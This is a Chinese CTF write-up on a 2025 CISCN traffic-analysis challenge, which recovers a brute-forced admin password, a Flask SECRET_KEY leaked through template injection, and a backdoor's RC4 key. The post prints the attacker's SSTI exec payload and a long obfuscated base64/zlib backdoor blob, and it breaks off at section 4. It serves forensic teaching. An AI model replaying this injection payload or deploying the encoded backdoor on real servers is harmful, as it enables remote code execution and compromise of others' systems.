itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025CISCN流量分析全复盘与技法总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1398234521018846/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    蚁景网安实验室
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:59:35.000Z" title="Tue Jan 13 2026 01:59:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">0.前言</h2>
<p>一直以来都想写个流量分析的做题总结，总结一些思路和方法，但找不到好的例题，刚好国赛这道流量分析就挺适合的</p>
<p>题目内容</p>
<pre><code class="hljs language-c" lang="c">近期发现公司网络出口出现了异常的通信，现需要通过分析出口流量包，对失陷服务器进行定位。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写<span class="hljs-built_in">exp</span>或数据包重放，查找服务器上安装的后门木马，然后分析木马外联地址和通信密钥以及木马启动项位置。
</code></pre>
<h2 data-id="heading-1">1.SnakeBackdoor-1</h2>
<pre><code class="hljs">攻击者爆破成功的后台密码是什么？，结果提交形式：flag{xxxxxxxxx}
</code></pre>
<p>直接筛选出http流量</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff9046eff77045bea58a6e3cabf8e0df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=sVLBbrXsR%2F8cZlG2mZjJ5eGHcNY%3D" alt="" loading="lazy"/></p>
<p>并找到最后一个login，右键追踪一下，就看到后台密码了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9621c4ec2e9141799e8609037b90d298~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=7cUJxklZvXHr3gtD%2BeL2%2BOkqsMw%3D" alt="" loading="lazy"/></p>
<p>flag{zxcvbnm123}</p>
<h2 data-id="heading-2">2.SnakeBackdoor-2</h2>
<pre><code class="hljs language-go" lang="go">攻击者通过漏洞利用获取Flask应用的 <span class="hljs-string">`SECRET_KEY`</span> 是什么，结果提交形式：flag{xxxxxxxxxx}
</code></pre>
<p>模糊查询，直接找到这个关键字“SECRET_KEY"</p>
<pre><code class="hljs language-sql" lang="sql">http <span class="hljs-keyword">contains</span> "SECRET_KEY"
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3748fd028f6f4f45995a0b8efafe41b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=OqS1DisrI6KAg015F04dqYbtLUk%3D" alt="" loading="lazy"/></p>
<p>右键进行一个追踪，并查询关键字SECRET_KEY</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e59327389edb496285688da43e748712~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=gPLBPozf3UgueXoSjZZkzeUh5CM%3D" alt="" loading="lazy"/></p>
<p>这段流量是 <strong>Flask 框架应用配置对象</strong> 的完整序列化输出，攻击者通过 <strong>SSTI（服务端模板注入）</strong> 漏洞成功读取了内存中的敏感变量</p>
<ul>
<li>
<p><strong>内容</strong>：'SECRET_KEY': 'c6242af0-6891-4510-8432-e1cdf051f160'</p>
</li>
<li>
<p><strong>安全意义</strong>：这是 Flask 应用最核心的安全凭证</p>
</li>
<li>
<p><strong>一般用来</strong>：Session 签名，也就是Flask 默认将 Session 存储在客户端 Cookie 中，并使用此 Key 进行 HMAC 签名，一旦泄露，攻击者可以使用工具，比如说 flask-unsign伪造任意用户的 Session，例如将 user_id 改为 1 或 admin，从而实现<strong>越权登录</strong>，甚至在某些配置下导致 <strong>RCE</strong></p>
</li>
</ul>
<p>所以对应的flag{c6242af0-6891-4510-8432-e1cdf051f160}</p>
<h2 data-id="heading-3">3.SnakeBackdoor-3</h2>
<pre><code class="hljs language-scss" lang="scss">攻击者植入的木马使用了加密算法来隐藏通讯内容。请分析注入Payload，给出该加密算法使用的密钥字符串(Key) ，结果提交形式：flag{xxxxxxxx}
</code></pre>
<p>继续往后翻，会发现1789流有异常</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6aa70c6c70b7409abeb4127905f71c9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=DzWcQ6EfySjRi2iEolYloGKhVj0%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>为什么说这段流量是可疑的？</p>
</blockquote>
<ul>
<li>
<p>首先，内容以 {{ ... }} 包裹，正常的“预览预览”功能应该只处理纯文本或简单的 HTML，而这里提交的是 Jinja2 模板执行代码</p>
</li>
<li>
<p>其次，它有危险函数的调用，载荷中出现了 <code>url_for.__globals__['__builtins__']['exec']</code></p>
<ul>
<li>
<p><strong>globals</strong>，我们都知道它是试图访问 Python 的全局命名空间</p>
</li>
<li>
<p>exec，这又是 Python 最危险的函数，能将字符串当作代码执行，基本上<strong>任何在流量中看到的 exec 基本上都是 RCE 的标志</strong></p>
</li>
</ul>
</li>
<li>
<p>接着，它里面还嵌套了 base64.b64decode、zlib.decompress 以及 [::-1]等一大堆乱七八糟的东西，正常的业务请求绝不会将代码进行压缩、反转再发送</p>
</li>
<li>
<p>最后，一个简单的“Hello World”预览请求通常只有几十个字节，但这个请求的 Content-Length 达到了 <strong>4602</strong> 字节，说明其中隐藏了复杂的逻辑脚本</p>
</li>
</ul>
<p>判断好之后，我们就要分析这段内容是什么了</p>
<p>首先是SSTI 注入层，使用 {{<code>url_for.__globals__['__builtins__']['exec']</code>(代码, 上下文)}}，这是利用了 Flask 的模板注入漏洞来调用 Python 的内置 exec 函数</p>
<p>其次，Base64 编码层（外壳）exec(base64.b64decode('XyA9IGxh...'))这段 <strong>Base64 解码</strong>后是<code>_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])); exec((_)(b'=c4CU3xP...'))</code>这定义了一个解密函数 _：<strong>反转字符串 -&gt; Base64 解码 -&gt; Zlib 解压</strong></p>
<pre><code class="hljs language-css" lang="css">_ = lambda __ : <span class="hljs-built_in">__import__</span>(<span class="hljs-string">'zlib'</span>).<span class="hljs-built_in">decompress</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">'base64'</span>).<span class="hljs-built_in">b64decode</span>(__[::-<span class="hljs-number">1</span>]));exec((_)(<span class="hljs-selector-tag">b</span>'=c4CU3xP+//vPzftv8gri635a0T1rQvMlKGi3iiBwvm6TFEvahfQE2PEj7FOccTIPI8TGqZMC+l9AoYYGeGUAMcarwSiTvBCv37ys+N185NocfmjE/fOHei4One0CL5TZwJopElJxLr9VFXvRloa5QvrjiTQKeG+SGbyZm+<span class="hljs-number">5</span>zTk/V3nZ0G6Neap7Ht6nu+acxqsr/sgc6ReEFxfEe2p30Ybmyyis3uaV1p+Aj0iFvrtSsMUkhJW9V9S/<span class="hljs-selector-tag">tO</span>+<span class="hljs-number">0</span>/<span class="hljs-number">68</span>gfyKM/yE9hf6S9eCDdQpSyLnKkDiQk97TUuKDPsOR3pQldB/Urvbtc4WA1D/<span class="hljs-number">9</span>ctZAWcJ+jHJL1k+NpCyvKGVhxH8DLL7lvu+w9InU/<span class="hljs-number">9</span>zt1sX/TsURV7V0xEXZNSllZMZr1kcLJhZeB8W59ymxqgqXJJYWJi2n96hKtSa2dab/F0xBuRiZbTXFIFmD6knGz/oPxePTzujPq5IWt8NZmvyM5XDg/L8JU/mC4PSvXA+gqeuDxLClzRNDHJUmvtkaLbJvbZcSg7Tgm7USeJWkCQojSi+INIEj5cN1+FFgpKRXn4gR9yp3/V79WnSeEFIO6C4hcJc4mwpk+<span class="hljs-number">09</span>t1yue4+mAlbhlxnXM1Pfk+sGBmaUFE1kEjOpnfGnqsV+auOqjJgcDsivId+wHPHazt5MVs4rHRhYBOB6yXjuGYbFHi3XKWhb7AfMVvhx7F9aPjNmIiGqBU/hRFUuMqBCG+VVUVAbd5pFDTZJ3P8wUym6QAAYQvxG+ZJDRSQypOhXK/L4eFFtEziufZPSyrYPJWJlAQsDO+dli46cn1u5A5Hyqfn4vw7zSqe+VUQ/Ri/Knv0pQoWH1d9dGJwDfqmgvnKi+gNRugcfUjG73V6s/tihlt8B23KvmJzqiLPzmuhr0RFUJKZjGa73iLXT4OvlhLRaSbTT4tq/SCktGRyjLVmSj2kr0GSsqTjlL2l6c/cXKWjRMt1kMCmCCTV+aJe4npvoB99OMnKnZR4Ys526mTFToSwa5jmxBmkRYCmA82GFK7ak6bIRTfDMsWGsZvAEXv3Pfv5NRzcIFNO3tbQkeB/LIVOW5LfAkmR68/<span class="hljs-number">6</span>zrL0DZoPjzFZI5VLfq0rv9CwUeJkR3PHcuj++d/lOvk8/h3HzSgYTGCwl1ujz8h4oUiPyGT74NjbY7fJ8vUHqNz+ZVfOtVw/z3RMuqSUzEAKrjcU2DNQehB0oY7xIlOT9u9BT4ROoDFo+<span class="hljs-number">5</span>ZF6zVoHA4eIckXUOP3ypQv5pEYG+<span class="hljs-number">0</span>pW4MyHmAQfsOaWyMdfMoqbw/M9oImdGKdKy1Wq3aq+t+xuyVdNAQMhoW2A7zQzob8XGA3G8VuoKHGOcc25HCb/FYeSxdwyIedAxklLLYMBHojTSpD1dExozdi89Gikhz3305ndTmECv0ZoUOHacnqtUUhJly7VgvX+JlawAY9orNPUmZM7QKbdOkTf/o8aQlS5Fe/xQkOMJGm4NXqLehiRIb925sTfVxwoNfP5v1MGlarYMifHl2rEp5C71ipFjpAGaEp9nRj0JgEa4lSTuYeVXwqbZQT3OfQvgt/bHJlAguqSWysGhqhITJYM6T10m71JiwfQH5iLXH5XbFk53QGcG2cAnFrWy70xEvabmf0u0ikQwpU2scP8LoEa/ClJnPSuWwicMkVLrkZGqnBvbk6JTg7HnT0vGUcV6kffIL6CK3bE1Fy0R6sl+UPoYvjkgSI3UbfD67bRxIxegBpYTzyCDzPytSE+a77sdxsghLpUC5hxz4ZeXdyIrbmhAqQw5eEnBuASE5qTMJkTp//hky+dT2pciOBYn/ACSLxprLZ0Ay1+zhl+XyV9WFL4NgBoH34bvkxH36nctszopWGPyd14RiS4d0EqNocqvtWu3YxkNgP+<span class="hljs-number">8</span>fM/d/B0ikxKxh/GjkmQXaSX/<span class="hljs-selector-tag">B</span>+<span class="hljs-number">40</span>U4bfSbsEJpVOsTHTy6u0Nr67Sw7BvRwuVvfT0/<span class="hljs-number">8</span>j73gYHBO2fGSIJ47ArYVm2+LzRT0iH5j7yVRmptcnAn8KkxJ63WBGb7u3bd+D+<span class="hljs-number">3</span>ylnm1h4AR7MGN6r6LxpjNlAX11wa/XB1zN8cWUNnC3VczfwUEwPfi5dyo9nEC5WO9Um78WKRrm3c48IvTUhgdNeQEDosIfhMSmikEluQX8LcCRcK9eUT85bvr5J5rzEb+DuiGYyDFG7PZefvIb3w33u2q8zlxltWCStc5O4q8iWrVI7taZHxowTw5zJg9TdhBZ+fQrQtc0ydrBlvAlnY10vECnFUBA+y1lWsVn8cKxUjTdati4AF3iM/KuEtQ6Zn8bI4LYwMlGnCA1RG88J9l7G4dJzsWr9xOiD8iMI2N1eZd/QUy43YsILWx80yiCxz+G4bXf2qNRFvNOawPSnrpv6Q0oFEZojluPx7cOU27bAbgpwTKo0VUyH6G4+ysviQzU7SRd51LGG3U6cT0YDidQmz2ewtbkkKcGVcSyYOeClV6CRz6bdF/Gm3T2+Q914/lkZbKx19WnX78r+xw6bpjzWLr0E1gjnKCVxW0XSnwe+iG9dkG8nCFfjUlhdTaS1gJ7LFsmUjn8u/vRQbRLw/y66Irr/ynKOCzROcgrnDFxH3z3JTQQpTiDpeyzRsF4SnGBMv5Hbr+cK6YTa4MIbfzj5Ti3FMgJNqgK5Xk9hsilGsU6tUbnp6SKiJhUvJ8bqynUMEzndl+S+OVRCaH2iJl8U3WjyB68Rq4HATk/cK7LkJHHMjC3W7dTmOBpfoWMVELaL+RkqWYv0CpW5qENLlnOPBrGaGNeIZahzbnruEPIIXGkGz1fE5d42MaKZsCUYt1xXiai9+cbKGj/d0lICq7uc7bRhEBx46DyBXTz1gfJnT2ur6x4Avb5wY2pcYrcD2OR6AikMvm2c0bhabJB6o0DhONJ4lCxmKdGBzuwrts1u0D2yuo37yLLfsGDuyepNw8lyTNc2nyhCVBfW23DnBQmWc1QLCoRppVhjKXwOpODKO8R8YHnQM+rLk6EOabCdGK57iRzMcT3wc436kVmHXDcI0ZsYGY5aIC5DbdWjUt2ZuU0LmuLwzCTS99zhOoO8DKNqbK4bINLyAI2X928xib+hmIOqp3oSgC2PdFc8yqthN9S55omtex2xkEe8CY48C6z4JtqVtqhPQWQ8kte6xlepiVYCqIbE2Vg4fN//L/ff/u//<span class="hljs-number">9</span>p4Lz7uq46yWenkJ/x90j/<span class="hljs-number">5</span>mEIors5McSuFi9dygyyR5wJfuqGhOfsVVwJe'))
</code></pre>
<p>接着，反转 + Zlib 压缩层攻击者将真正的恶意代码，也就是上述那段以 =c4CU3xP 开头的巨大字符串，进行了 Zlib 压缩，并做了<strong>字符反转</strong>，最后再 Base64 编码</p>
<p>最后注意 Payload 末尾：{'request':..., 'app':get_flashed_messages.<strong>globals</strong>['current_app']}，攻击者将 Flask 的 app 对象传入了执行环境。这意味着恶意代码可以直接读取 app.config</p>
<p>所以exp.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> base64import zlibimport refrom typing <span class="hljs-keyword">import</span> <span class="hljs-type">Tuple</span>, <span class="hljs-type">Optional</span>​<span class="hljs-keyword">class</span> <span class="hljs-title class_">PayloadDecoder</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_layers: <span class="hljs-built_in">int</span> = <span class="hljs-number">200</span></span>):        self.max_layers = max_layers        self.pattern = <span class="hljs-string">r"exec\(\(_\)\(b'([^']+)'\)\)"</span>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_reverse_bytes</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        <span class="hljs-keyword">return</span> data[::-<span class="hljs-number">1</span>]        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_base64_decode</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        <span class="hljs-keyword">return</span> base64.b64decode(data)        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_zlib_decompress</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        <span class="hljs-keyword">return</span> zlib.decompress(data)        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_extract_nested_payload</span>(<span class="hljs-params">self, text: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]:        <span class="hljs-keyword">match</span> = re.search(self.pattern, text)        <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_blob</span>(<span class="hljs-params">self, encoded: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        reversed_data = self._reverse_bytes(encoded)        decoded = self._base64_decode(reversed_data)        decompressed = self._zlib_decompress(decoded)        <span class="hljs-keyword">return</span> decompressed        <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_payload</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">bytes</span>]:        current = self.decode_blob(payload)        layer_count = <span class="hljs-number">1</span>                <span class="hljs-keyword">while</span> layer_count &lt; self.max_layers:            <span class="hljs-keyword">try</span>:                text_content = current.decode(<span class="hljs-string">'utf-8'</span>)            <span class="hljs-keyword">except</span> UnicodeDecodeError:                text_content = current.decode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'replace'</span>)                        extracted = self._extract_nested_payload(text_content)                        <span class="hljs-keyword">if</span> extracted <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:                <span class="hljs-keyword">break</span>                            current = self.decode_blob(extracted.encode())            layer_count += <span class="hljs-number">1</span>                <span class="hljs-keyword">return</span> layer_count, current​<span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>():    encoded_payload = <span class="hljs-string">b'=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'</span>        decoder = PayloadDecoder()    layers, content = decoder.process_payload(encoded_payload)        <span class="hljs-built_in">print</span>(layers)    <span class="hljs-built_in">print</span>(content.decode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'replace'</span>))​<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    execute()
</code></pre>
<p>跑出来源代码</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01279623dae14bf29167e4f3e5768698~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=LkCtv27tZSa280zIyEhfA9LiJvo%3D" alt="" loading="lazy"/></p>
<p>可以看到复原出来的源代码RC4的密钥是v1p3r_5tr1k3_k3y，所以flag{v1p3r_5tr1k3_k3y}</p>
<h2 data-id="heading-4">4.SnakeBackdoor-4</h2>
